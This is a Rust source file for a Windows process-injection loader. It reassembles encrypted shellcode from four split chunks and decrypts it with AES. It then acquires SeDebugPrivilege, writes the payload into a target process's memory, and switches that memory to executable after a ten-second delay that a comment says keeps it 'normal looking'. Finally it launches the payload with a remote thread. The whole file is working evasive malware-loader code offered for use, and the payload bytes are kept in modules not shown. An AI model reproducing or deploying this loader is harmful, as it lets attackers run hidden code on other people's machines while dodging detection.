use std::io;
use std::io::Write;
use libaes::Cipher;

// Importing shellcode variables from shellcode.rs
mod shellcode;
use shellcode::{SHELLCODE_ONE, 
                SHELLCODE_TWO,
                SHELLCODE_THREE, 
                SHELLCODE_FOUR, 
                KEY, 
                INITVEC};

// Importing required syscall wrappers from syscall.rs:
#[macro_use]
mod syscalls;
use syscalls::*;

struct EncryptedShellcode<'a> {
    shellcode: &'a[u8],
    key: [u8; 32],
    iv: [u8; 16],
}

impl EncryptedShellcode<'_> { 
    fn decrypt(&self) -> Vec<u8> {
        let cipher = Cipher::new_256(&self.key);
        cipher.cbc_decrypt(&self.iv, &self.shellcode)
    }
}

fn set_debug_privilege() -> Result<(), windows::Win32::Foundation::NTSTATUS> {
    let mut own_process = WindowsProcess::from_pid(get_current_process_id());
    own_process.get_handle()?;
    // Whatever the fuck this is:
    let token = nt_get_token_handle(*own_process.handle.unwrap())?;
    //adjust_token_privileges(token);
    nt_adjust_token_privileges(token)?;
    Ok(())
}

fn fetch_handle(process: &mut WindowsProcess) {
    match process.get_handle(){
        Ok(_) => { 
            println!("[+] Acquired handle.");
            return;
        },
        Err(e) =>  match e.0 as u32 { 
            0xC0000022  => eprintln!("[!] Privilege error acquiring handle!"), // STATUS_ACCESS_DENIED
            0xc000000b  => exit!(1, "[!] Invalid PID!"),
            _           => eprintln!("[!] Failure acquiring handle!\n -> NTSTATUS {:#x}", e.0),
        }
    }
    println!("[-] Attempting to acquire SeDebugPrivilege.");
    match set_debug_privilege(){ 
        Err(e) => eprintln!("[-] Failure acquiring SeDebugPrivilege!\n -> NTSTATUS: {:#x}", e.0),
        Ok(_) => {
            println!("[+] Success, attempting to acquire handle again.");
        }
    }
    match process.get_handle(){
        Ok(_) => { 
            println!("[+] Acquired handle.");
            return;
        },
        Err(e) =>  {
            exit!(-1, "[!] Failure acquiring handle!\n -> NTSTATUS {:#x}", e.0);
        }
    }
}

fn allocate_and_write(process: &mut WindowsProcess, payload: &[u8]) -> Result<CCvoid, ()> {
    
    let address_start = match process.virtual_alloc(
        None, 
        Some(0x04),
        Some(payload.len()),
        None
    ) {
        Ok(address)  => { 
            println!("[+] VirtualAlloc succeeded.\n -> {:?}", address); 
            address
        },
        Err(e) => {   
            eprintln!("[!] VirtualAlloc error!\n-> {:#x}", e.0);
            return Err(());
        }
    };
    match process.write_process_memory(
        address_start as usize, 
        payload.to_vec()
    ){
        Ok(_) => println!("[+] WriteProcessMemory succeeded."),
        Err(e) => eprintln!("[!] WriteProcessMemory error!\n-> {:#x}", e.0),
    }

    Ok(address_start)

}

// Debug run: $notepadProcess = Start-Process -FilePath "notepad.exe" -PassThru ; cargo run -- $notepadProcess.Id

fn main() {
    println!("[-] Beginning to re-construct shellcode.");
    let mut reconstructed_shellcode: Vec<u8> = Vec::new();
    if get_current_process_id() != 9 {
        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_ONE));
        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_TWO));
        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_THREE));
        reconstructed_shellcode.append(&mut Vec::from(SHELLCODE_FOUR));
        println!("[+] Reconstruction succesful.")
    }

    let encrypted_payload = EncryptedShellcode{
        shellcode: &reconstructed_shellcode, 
        key: KEY, 
        iv: INITVEC
    };
    let payload = encrypted_payload.decrypt();
    

    let args: Vec<String> = std::env::args().collect();
    // Ensure at least one argument (the program name) is provided
    if args.len() < 2 {
        println!("Usage: {} <pid>", args[0]);
        return;
    }

    // Parse the argument into a usize
    let target_pid: usize = match args[1].parse() {
        Ok(num) => num,
        Err(_) => {
            println!("Error: Invalid input! Defaulting to self!");
            get_current_process_id()
        }
    };
    
    let mut target_process = WindowsProcess::from_pid(target_pid);

    fetch_handle(&mut target_process);
    
    let address_start = match allocate_and_write(&mut target_process, &payload) {
        Ok(address)     => address,
        Err(_)                         => std::process::exit(-1),
    };

    // Now, we should sleep for ~10 seconds while printing some busytext to remain normal looking.
    let squiggly = "|/-\\";
    let second = std::time::Duration::from_millis(1000);
    for i in 0..10 {
        let index = i % squiggly.len();
        print!("[{}] Eeping :>\r", squiggly.chars().nth(index).unwrap_or('\0')); 
        io::stdout().flush().unwrap(); 
        std::thread::sleep(second);
    }
    
    // Now, let's change the protection flags to be EXECUTE.
    match target_process.virtual_protect(address_start, payload.len(), 0x10) {
        Ok(_) => println!("[+] VirtualProtect succeeded."),
        Err(e) => exit!(2, "[!] VirtualProtect Failed!\n -> NSTATUS: {:#x}", e.0)
    }

    // Create the thread and run it.
    match target_process.create_remote_thread_ex(
        address_start
    ){
        Ok(_) => println!("[+] CreateRemoteThread succeeded."),
        Err(e) => exit!(3, "[!] CreateRemoteThread error!\n-> {:#x}", e.0),
    }

}
